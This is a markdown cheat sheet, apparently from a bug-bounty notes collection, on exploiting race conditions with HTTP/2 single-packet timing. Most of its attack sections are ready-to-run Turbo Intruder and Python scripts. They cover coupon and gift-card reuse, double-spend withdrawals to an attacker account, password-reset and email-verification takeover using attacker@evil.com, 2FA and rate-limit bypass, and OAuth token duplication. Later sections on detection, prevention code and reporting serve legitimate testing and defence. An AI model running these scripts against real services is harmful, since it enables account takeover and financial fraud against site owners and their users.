---
tags:
  - high
---

# Race Condition → Business Logic Bypass

Exploiting timing windows to break application state and bypass security controls.

## TL;DR

Race conditions exploit the gap between **check** and **action**. When multiple requests hit a server simultaneously, they can:
- Use coupons/gift cards multiple times
- Double-spend account balances
- Bypass rate limits and 2FA
- Corrupt session state for account takeover

**Key insight**: Every HTTP request transitions through hidden "sub-states" — with precise timing, you can abuse these fleeting states.

## Overview

```
Concurrent Requests → Race Window → State Collision → Logic Bypass
                           ↓
   Limit Bypass     (coupons, votes, rewards)
   Balance Manip    (double-spend, overdraw)
   State Confusion  (password reset, 2FA bypass)
   Session Fixation (email verification swap)
```

---

## HTTP/2 Single-Packet Attack

**The breakthrough technique from James Kettle (PortSwigger) — Black Hat USA 2023**

Traditional race conditions were unreliable due to network jitter. The single-packet attack solves this by completing 20-30 HTTP/2 requests with a **single TCP packet**, eliminating network variance entirely.

### How It Works

```
1. Open HTTP/2 connection
2. Send all requests EXCEPT final byte of each
3. Wait 100ms for packets to arrive at server
4. Send ALL final bytes in ONE TCP packet
5. Server processes all requests simultaneously
```

### Benchmark Results

| Technique | Median Spread | Std Deviation |
|-----------|--------------|---------------|
| Last-byte sync (HTTP/1.1) | 4ms | 3ms |
| **Single-packet (HTTP/2)** | **1ms** | **0.3ms** |

**Result**: 4-10x more effective. A real vulnerability that took 2+ hours with last-byte sync was exploited in **30 seconds** with single-packet.

---

## Turbo Intruder Scripts

### Basic Single-Packet Attack

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2  # Required for HTTP/2
                          )
    
    # Queue 20 identical requests with gate
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    # Release all requests simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Multi-Endpoint Race (Payment + Add Item)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    # Payment request
    paymentReq = '''POST /checkout/pay HTTP/2
Host: target.com
Cookie: session=xxx
Content-Type: application/x-www-form-urlencoded

cart_id=123&payment_method=card'''
    
    # Add item request  
    addItemReq = '''POST /cart/add HTTP/2
Host: target.com
Cookie: session=xxx
Content-Type: application/x-www-form-urlencoded

product_id=expensive_item&qty=1'''
    
    # Send payment + multiple add-item requests
    engine.queue(paymentReq, gate='race1')
    for i in range(10):
        engine.queue(addItemReq, gate='race1')
    
    engine.openGate('race1')
```

### Password Reset Token Race

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    # Same session, two different emails
    attackerEmail = '''POST /password-reset HTTP/2
Host: target.com
Cookie: session=victim_session
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com'''
    
    victimEmail = '''POST /password-reset HTTP/2
Host: target.com
Cookie: session=victim_session
Content-Type: application/x-www-form-urlencoded

email=victim@target.com'''
    
    # Alternate to maximize collision chance
    for i in range(10):
        engine.queue(attackerEmail, gate='race1')
        engine.queue(victimEmail, gate='race1')
    
    engine.openGate('race1')
```

### HTTP/1.1 Fallback (Last-Byte Sync)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,  # Parallel connections
                          requestsPerConnection=1,
                          engine=Engine.THREADED  # HTTP/1.1 mode
                          )
    
    for i in range(30):
        engine.queue(target.req, gate='race1')
    
    engine.start(timeout=10)
    engine.openGate('race1')
    engine.complete(timeout=60)
```

---

## Chain 1: Limit Overrun — Coupon/Discount Abuse

**The classic race condition — apply a one-time code multiple times**

### Vulnerable Pattern

```python
# Pseudo-code: TOCTOU vulnerability
def apply_coupon(coupon_code, cart):
    if coupon_code not in used_coupons:     # CHECK
        cart.apply_discount(coupon_code)     # USE
        used_coupons.add(coupon_code)        # UPDATE (too late!)
```

### Attack

```http
POST /cart/coupon HTTP/2
Host: shop.example.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

code=SAVE50
```

**Send 20+ times simultaneously → discount applied multiple times**

### Real-World Examples

| Target | Vulnerability | Bounty |
|--------|--------------|--------|
| Reverb.com | Gift card redeemed multiple times | $500 |
| Starbucks | Reward points multiplied | $3,000 |
| Various e-commerce | Coupon stacking via race | $1,000-5,000 |

### Burp Suite Repeater Method

1. Create request group (right-click → Add to tab group)
2. Add 20 copies of coupon request
3. Right-click group → **Send group in parallel**

---

## Chain 2: Balance Manipulation — Double-Spend

**Withdraw/transfer more than your balance allows**

### Vulnerable Pattern

```python
def withdraw(user, amount):
    balance = get_balance(user)     # READ
    if balance >= amount:           # CHECK
        # Race window here!
        deduct_balance(user, amount) # WRITE
        send_money(amount)
```

### Attack Scenario

```
Account balance: $100
Attacker sends 5 concurrent withdrawals of $100
Expected: 1 succeeds, 4 fail
Actual: 2-3 succeed = $200-300 withdrawn from $100 balance
```

### Turbo Intruder Script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    withdrawReq = '''POST /api/withdraw HTTP/2
Host: bank.example.com
Authorization: Bearer xxx
Content-Type: application/json

{"amount": 100, "destination": "attacker_account"}'''
    
    for i in range(20):
        engine.queue(withdrawReq, gate='race1')
    
    engine.openGate('race1')
```

### Financial Platform Variations

- **Crypto exchanges**: Withdraw more tokens than balance
- **Gaming platforms**: Bet more credits than available
- **Gift card sites**: Transfer full balance multiple times
- **Reward programs**: Redeem points multiple times

---

## Chain 3: State Confusion — Password Reset Takeover

**From James Kettle's research: Session-based race condition in password reset**

### Vulnerable Pattern (Devise/Rails common issue)

```ruby
# Password reset flow stores in session
session[:reset_user_id] = params[:email]
token = generate_token()
session[:reset_token] = token
send_email(params[:email], token)
```

### Attack

Two concurrent password reset requests from **same session**, different emails:
1. Request A: `email=victim@target.com`
2. Request B: `email=attacker@evil.com`

**Result**: Session ends up with:
- `reset_user_id = victim@target.com` (from request A)
- `reset_token = [token sent to attacker@evil.com]` (from request B)

Attacker receives token that resets victim's password!

### Exploitation Script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    for attempt in range(20):
        # Victim email
        engine.queue('''POST /password/reset HTTP/2
Host: target.com
Cookie: session=shared_session_id

email=victim@company.com''', gate=str(attempt))
        
        # Attacker email
        engine.queue('''POST /password/reset HTTP/2
Host: target.com
Cookie: session=shared_session_id

email=attacker@evil.com''', gate=str(attempt))
        
        engine.openGate(str(attempt))
```

---

## Chain 4: 2FA Bypass via Race Window

**Exploit the sub-state between login and 2FA enforcement**

### Vulnerable Pattern

```python
def login(username, password):
    user = authenticate(username, password)
    session['user_id'] = user.id          # Logged in!
    if user.mfa_enabled:
        session['enforce_mfa'] = True      # MFA flag set AFTER login
        redirect('/mfa-verify')
```

**Race window**: User is "logged in" before `enforce_mfa` is set.

### Attack

Simultaneously:
1. Send login request
2. Send request to sensitive authenticated endpoint

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    loginReq = '''POST /login HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=victim&password=known_password'''
    
    adminReq = '''GET /admin/dashboard HTTP/2
Host: target.com
Cookie: session=new_session_token'''
    
    engine.queue(loginReq, gate='race1')
    for i in range(10):
        engine.queue(adminReq, gate='race1')
    
    engine.openGate('race1')
```

### Reported Bounties

- **HackerOne**: 2FA bypass via race condition — $2,500
- **GitLab**: Email verification race — Critical severity

---

## Chain 5: Email Verification Swap (GitLab Vulnerability)

**Confirms wrong email address via race**

### Attack Flow

```
1. Request email change to attacker@evil.com
2. Simultaneously request change to victim@target.com
3. Server sends verification tokens in race
4. Email to attacker contains token for victim's address
5. Click link → victim email now controlled by attacker
```

### Proof of Concept

```http
# Request 1 - Send 10 times
POST /api/user/email HTTP/2
Host: gitlab.example.com
Cookie: session=xxx

{"email": "attacker@evil.com"}

# Request 2 - Send 10 times
POST /api/user/email HTTP/2
Host: gitlab.example.com
Cookie: session=xxx

{"email": "victim@company.com"}
```

**Monitor attacker inbox for verification link → may confirm victim's email**

---

## Chain 6: Partial Construction Race

**Exploit uninitialized database fields**

### Vulnerable Pattern

```python
# User creation in two steps
INSERT INTO users (email, username) VALUES (?, ?)  # Step 1
UPDATE users SET api_key = ? WHERE id = ?          # Step 2

# Brief window where api_key is NULL/empty
```

### Attack

```http
# Registration request
POST /register HTTP/2
Host: target.com

email=test@test.com&username=newuser

# Simultaneously try to login with empty token
POST /api/auth HTTP/2
Host: target.com

token=                     # Empty string
token[]=                   # Empty array (PHP)
```

**PHP trick**: `param[]=` results in empty array, which may match uninitialized field

### Ruby on Rails Version

```
POST /api/verify?token[key]=
# Results in: {"token" => {"key" => nil}}
# May match user with nil confirmation token
```

---

## Chain 7: Rate Limit Bypass

**Exhaust brute-force protection with parallel requests**

### Attack

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    # Send 100 password guesses before rate limit kicks in
    passwords = ['password1', 'password2', ...] # 100 passwords
    
    for pwd in passwords:
        engine.queue(target.req.replace('%s', pwd), gate='race1')
    
    engine.openGate('race1')
```

**Result**: 100 attempts processed before counter increments → bypass 5-attempt limit

---

## Chain 8: OAuth Refresh Token Race

**Generate multiple valid refresh tokens**

### Attack Flow

```
1. Legitimate OAuth authorization grants code
2. Race multiple token exchange requests
3. Each request may generate separate refresh token
4. User revokes access → some tokens survive
```

### Exploitation

```python
# Same authorization_code, multiple simultaneous exchanges
for i in range(20):
    engine.queue('''POST /oauth/token HTTP/2
Host: oauth.provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=SAME_CODE&redirect_uri=...''', 
    gate='race1')

engine.openGate('race1')
```

---

## Python Alternative (No Burp Suite)

### Using httpx + asyncio

```python
import asyncio
import httpx

async def race_request(client, url, data):
    return await client.post(url, data=data)

async def main():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = []
        
        # Create 20 concurrent requests
        for _ in range(20):
            tasks.append(
                asyncio.ensure_future(
                    race_request(client, 
                        'https://target.com/apply-coupon',
                        {'code': 'DISCOUNT50'}
                    )
                )
            )
        
        # Fire all simultaneously
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if hasattr(r, 'status_code'):
                print(f"Status: {r.status_code}")

asyncio.run(main())
```

### Using h2spacex (True Single-Packet)

```python
from h2spacex import H2OnTlsConnection

host = "target.com"
port = 443

h2_conn = H2OnTlsConnection(hostname=host, port_number=port)
h2_conn.setup_connection()

# Generate stream IDs
stream_ids = h2_conn.generate_stream_ids(number_of_streams=50)

all_headers = []
all_data = []

for i, stream_id in enumerate(stream_ids):
    headers, data = h2_conn.create_single_packet_http2_post_request_frames(
        method='POST',
        headers_string='Content-Type: application/x-www-form-urlencoded\r\nCookie: session=xxx',
        scheme='https',
        stream_id=stream_id,
        authority=host,
        body='code=DISCOUNT50',
        path='/apply-coupon'
    )
    all_headers.append(headers)
    all_data.append(data)

# Send headers (everything except last byte)
h2_conn.send_bytes(b''.join(bytes(h) for h in all_headers))

import time; time.sleep(0.1)  # Wait for network

# Send ping to warm connection
h2_conn.send_ping_frame()

# Release all final bytes simultaneously
h2_conn.send_bytes(b''.join(bytes(d) for d in all_data))

# Read responses
resp = h2_conn.read_response_from_socket(_timeout=5)
```

---

## Detection Methodology

### 1. Identify Targets

**Look for:**
- Single-use tokens (coupons, invites, verification)
- Balance/counter operations
- State-changing operations on shared resources
- Session-stored data modified by multiple endpoints

**Key questions:**
- Is state stored server-side (not just JWT)?
- Does the operation EDIT existing data (not just append)?
- What's the operation keyed on (session, user ID, token)?

### 2. Benchmark Normal Behavior

Send requests sequentially first to understand expected responses.

### 3. Send Parallel Requests

Use single-packet attack with 20-30 requests.

### 4. Look for Clues

- Different response codes
- Different response times
- Different response bodies
- Second-order effects (extra emails, changed data)

**Negative timestamps in Turbo Intruder** = response before request completed = race confirmed!

---

## Session-Based Locking Bypass

**PHP locks requests per session by default**

```php
// PHP serializes requests with same session
session_start();  // Blocks until previous request completes
```

### Bypass

Use **different session tokens** for each parallel request:

```python
sessions = ['session1', 'session2', 'session3', ...]

for i, sess in enumerate(sessions):
    req = target.req.replace('session=xxx', f'session={sess}')
    engine.queue(req, gate='race1')
```

---

## Real Bug Bounty Reports

| Platform | Vulnerability | Impact | Bounty |
|----------|--------------|--------|--------|
| HackerOne | Flag submission race | Points inflation | N/A |
| Reverb.com | Gift card redeem race | Financial | $500 |
| GitLab | Email verification race | Account takeover | Critical |
| Starbucks | Reward multiplication | Financial | $3,000 |
| Every.org | Follow race condition | Social manipulation | $250 |
| Pornhub Premium | Subscription race | Access control | $520 |

---

## Prevention

### 1. Database-Level Locking

```sql
-- Pessimistic locking
SELECT balance FROM accounts WHERE id = ? FOR UPDATE;

-- Optimistic locking with version
UPDATE accounts 
SET balance = balance - 100, version = version + 1 
WHERE id = ? AND version = ?;
```

### 2. Idempotency Keys

```python
def process_payment(idempotency_key, amount):
    if redis.setnx(f"payment:{idempotency_key}", "processing"):
        # First request - process
        result = charge_card(amount)
        redis.set(f"payment:{idempotency_key}", result)
    else:
        # Duplicate - return cached result
        return redis.get(f"payment:{idempotency_key}")
```

### 3. Atomic Operations

```python
# Bad
balance = get_balance(user)
if balance >= amount:
    set_balance(user, balance - amount)

# Good - atomic decrement
result = db.execute("""
    UPDATE accounts 
    SET balance = balance - %s 
    WHERE id = %s AND balance >= %s
    RETURNING balance
""", (amount, user_id, amount))
```

### 4. Request Serialization

```python
import threading

user_locks = {}

def get_user_lock(user_id):
    if user_id not in user_locks:
        user_locks[user_id] = threading.Lock()
    return user_locks[user_id]

def withdraw(user_id, amount):
    with get_user_lock(user_id):
        # Serialized per-user
        process_withdrawal(user_id, amount)
```

### 5. Cryptographic Tokens

```python
# Use unpredictable, one-time tokens
import secrets

def generate_coupon():
    return secrets.token_urlsafe(32)  # Can't be predicted/reused
```

---

## Impact Scoring

| Scenario | Impact | CVSS |
|----------|--------|------|
| Rate limit bypass (login) | Medium | 5.3 |
| Coupon/discount abuse | Medium-High | 6.5 |
| Balance manipulation | High | 8.1 |
| 2FA bypass | High | 8.1 |
| Account takeover via state confusion | Critical | 9.8 |

---

## PoC Report Template

```markdown
## Summary
Race condition in [endpoint] allows [impact] by sending concurrent requests.

## Vulnerability Type
TOCTOU (Time-of-Check to Time-of-Use) / Race Condition

## Steps to Reproduce
1. Configure Burp Suite with Turbo Intruder
2. Create request to [endpoint]
3. Send 20 parallel requests using single-packet attack
4. Observe [unexpected behavior]

## Request
POST /endpoint HTTP/2
Host: target.com
[headers]

[body]

## Impact
[Describe business impact - financial loss, unauthorized access, etc.]

## Remediation
- Implement database-level locking
- Use idempotency keys for sensitive operations
- Atomic database operations

## References
- https://portswigger.net/research/smashing-the-state-machine
```

---

## Tools

| Tool | Use Case |
|------|----------|
| **Burp Suite Repeater** | Quick parallel group sending |
| **Turbo Intruder** | Complex race scripts, HTTP/2 |
| **h2spacex** | Python HTTP/2 single-packet |
| **httpx** | Python async HTTP/2 client |
| **Wireshark** | Verify single-packet delivery |

---

*Research credit: James Kettle (PortSwigger) — "Smashing the State Machine" Black Hat USA 2023*

*Related: [OAuth to ATO](oauth-to-ato.md) | [XSS to ATO](xss-to-ato.md)*
